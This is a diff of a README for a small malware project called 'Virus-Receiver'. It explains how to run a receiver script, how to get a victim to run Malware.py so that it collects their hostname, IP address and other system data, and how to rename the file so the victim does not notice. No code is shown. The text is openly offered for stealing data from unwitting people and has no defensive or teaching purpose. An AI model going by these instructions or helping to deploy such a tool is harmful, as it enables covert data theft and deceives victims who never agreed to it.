@@ -1,2 +1,7 @@
-# Virus-Receiver
-I made an Virus that collects System Data of the Victim. The Receiver saves the Data like Hostname, IP address in a txt file from your Folder.
+*THIS VIRUS SAVES SYSTEM DATAS FROM THE VICTIM
+1. Run receiver.py 
+2. After the Victim Runs Malware.py it select System Data like Hostname, Ip Adress,...
+3. It will save The Data In a txt file in your Receiver folder.
+
+*EXTRAS 
+1. Rename the Virus so the victim dont see trough
